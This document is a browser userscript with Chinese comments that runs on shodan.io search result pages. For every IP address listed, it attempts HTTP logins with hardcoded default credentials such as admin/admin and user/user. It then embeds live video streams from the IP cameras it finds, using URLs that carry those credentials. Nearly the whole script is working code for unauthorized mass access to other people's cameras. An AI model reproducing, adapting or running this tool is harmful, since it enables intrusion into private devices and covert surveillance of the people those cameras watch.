// ==UserScript==
// @name         [skypesky 出品] shodan.io helper
// @author       skypesky
// @namespace    http://skypesky.cn/user/shodan
// @version      18.05.28
// @description  shodan.io helper

// @include      *://www.shodan.io/search?query*

// @require      https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js
// @connect      *
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// ==/UserScript==
// url3 ip/videostream.cgi?loginuse=admin&loginpas=admin
(function () {
    "use strict";

    const css = `img.default {
        max-height: 320px; 
        max-width: 500px;
        margin: 20px 20px 20px 0px;
    }`;

    // 添加样式
    GM_addStyle(css);

    const deviceArray = [{
        name: `wificam`,
        viewArray: [
            `<div> <img class="default" onerror="$(this).hide()" src="http://%{ip}/videostream.cgi?loginuse=%{username}&loginpas=%{password}" /> </div>`
        ]
    }, {
        name: `ipcam`,
        viewArray: [
            `<img class="default random" onerror="$(this).hide()" src="http://%{ip}/video.cgi?resolution=sxga&amp;random=0.45081273910869846">`
        ]
    }, {
        name: `HTTP/1.1 401 Unauthorized`,
        viewArray: [
            `<embed onerror="$(this).hide()" src="http://%{ip}/swfs/StrobeMediaPlayback.swf" style="max-height: 400px; max-width: 600px; margin: 20px 20px 20px 0px;" quality="high" bgcolor="#000000" name="StrobeMediaPlayback" allowfullscreen="true" pluginspage="http://www.adobe.com/go/getflashplayer" flashvars="&amp;src=rtmp://%{ip}/flash/11:%{username}:%{password}&amp;autoHideControlBar=true&amp;streamType=live&amp;autoPlay=true" type="application/x-shockwave-flash">`
        ]
    }];


    const userInfoArray = [{
        name: `wificam`,
        rule: /wificam/,
        user: {
            username: `admin`,
            password: `admin`
        }
    }, {
        name: `ipcam`,
        rule: /ipcam/,
        user: {
            username: `admin`,
            password: `admin`
        }
    }, {
        name: `HTTP/1.1 401 Unauthorized`,
        rule: /HTTP%2F1\.1\+401\+Unauthorized/,
        user: {
            username: `user`,
            password: `user`
        }
    }, {
        name: `default`,
        rule: /[\S\s]*/,
        user: {
            username: `admin`,
            password: `admin`
        }
    }];

    $(function () {
        JqueryPlugin.load();
        ServerController.run(userInfoArray, deviceArray);
        $("img.random").on("load", function () {
            console.log("load img");
            setInterval(() => {
                let random = Math.random();
                $(this).attr("src", $(this).attr("src").replace(/\?[\S\s]*/, "?" + random));
            }, 1000);
        })

    });

})();

// 对于用户来说,只要有用户名和密码就能访问
function User(username, password) {
    this.username = username;
    this.password = password;
    this.logined = false;
}

// 登录一下账号
User.prototype.login = function (ip) {
    GM_xmlhttpRequest({
        url: `http://${this.username}:${this.password}@${ip}`,
        method: "GET",
        onload: function (response) {
            console.log("res: ", response);
        }
    });
    // 已经登录过了
    this.logined = true;
}

User.prototype.init = function (username, password) {
    this.username = username;
    this.password = password;
}

User.prototype.getLoginUrl = function (ip) {
    return ip;
}

function Product(user, deviceArray) {
    this.user = user;
    this.deviceArray = deviceArray;
}

Product.prototype.init = function (user, deviceArray) {
    this.user = user;
    this.deviceArray = deviceArray;
}

Product.prototype.getViewArray = function (ip) {
    if (ValidTool.arrayIsEmpty(this.deviceArray)) {
        return null;
    }
    let viewArray = [];
    let viewArrayIndex = 0;
    for (let index = 0; index < this.deviceArray.length; ++index) {
        for (let deviceArrayIndex = 0; deviceArrayIndex < this.deviceArray[index].viewArray.length; ++deviceArrayIndex) {
            viewArray[viewArrayIndex] = this.getView(ip, this.deviceArray[index].viewArray[deviceArrayIndex]);
            viewArrayIndex++;
        }
    }
    return viewArray;
}

Product.prototype.getView = function (ip, view) {
    // replace ip, username, password
    view = view.replace(/%{ip}/g, ip).replace("%{username}", this.user.username).replace("%{password}", this.user.password);
    return view;
}


const ServerController = {
    userInfoArray: [],
    deviceArray: [],
    init: function (userInfoArray, deviceArray) {
        this.userInfoArray = userInfoArray;
        this.deviceArray = deviceArray;
    },
    run: function (userInfoArray, deviceArray) {

        if (ValidTool.arrayIsEmpty(this.userInfoArray) || ValidTool.arrayIsEmpty(this.deviceArray)) {
            this.init(userInfoArray, deviceArray);
            if (ValidTool.arrayIsEmpty(this.userInfoArray) || ValidTool.arrayIsEmpty(this.deviceArray)) {
                return null;
            }
        }
        // 获取所有的ip节点
        let ipArray = $(".search-result .ip a[style]");
        if (ValidTool.arrayIsEmpty(ipArray)) {
            console.info("ipArray is empty");
            return;
        }
        // 创建一个用户
        let user = this.selectUser(window.location.href);
        console.info("user: ", user);
        for (let index = 0; index < ipArray.length; ++index) {
            // 获取ip
            let ip = $(ipArray[index]).attr("href");
            ip = ip.replace("http://", "");

            // 获取所有的链接
            let product = new Product(user, this.deviceArray);
            let viewArray = product.getViewArray(ip);
            // login
            user.login(ip);
            // 显示视频
            ViewTemplate.after($(ipArray[index]).parent(), viewArray);      
        }
    },
    selectUser: function (text) {
        if (text.length == 0 || ValidTool.isNullOrUndefined(text)) {
            return null;
        }
        for (let index = 0; index < this.userInfoArray.length; ++index) {
            if (this.userInfoArray[index].rule.test(text)) {
                return new User(this.userInfoArray[index].user.username, this.userInfoArray[index].user.password);
            }
        }
        return null;

    }
}

// 验证参数的工具类
const ValidTool = {
    arrayNotEmpty: function (arrayObject) {
        if (typeof arrayObject == "undefined" || !arrayObject || arrayObject.length == 0) {
            return false;
        }
        return true;
    },
    arrayIsEmpty: function (arrayObject) {
        return !this.arrayNotEmpty(arrayObject);
    },
    selectorIsNull: function (selector) {
        return $(selector).length == 0;
    },
    isNullOrUndefined: function (object) {
        return (object == null || object == undefined);
    },
    isNotNullAndUndefined: function (object) {
        return !this.isNullOrUndefined(object);
    }
}

// 视图模板
const ViewTemplate = {
    defaultImageView: function (url) {
        let imageView = `<div> <img onerror="$(this).hide();" src=${url} style="max-height: 400px; max-width: 600px; margin: 20px 20px 20px 0px;" /> </div>`;
        return imageView;
    },
    defaultHtmlView: function (html) {
        let htmlView = html;
        return htmlView;
    },
    after: function (selector, viewArray) {
        if (ValidTool.selectorIsNull(selector) || ValidTool.arrayIsEmpty(viewArray)) {
            console.log("viewArray is empty");
            return;
        }
        console.log("viewArray is not empty");
        for (let index = viewArray.length - 1; index >= 0; --index) {
            $(selector).after(viewArray[index]);
        }
    }
}

// jquery拓展
const JqueryPlugin = {
    load: function () {
        this.extend();
    },
    extend: function () {
        $.extend({
            runWhenLoad: function (selector, length, callback) {
                if ($(selector).length > length) {
                    // console.log("task success outnner");
                    callback();
                    return;
                }
                let task = setInterval(() => {
                    // console.log("task block", $(selector), $("selector").outerHTML);
                    if ($(selector).length > length) {
                        console.log("task success inner");
                        clearInterval(task);
                        callback();
                        return;
                    }
                }, 50);
            }
        });
    }
};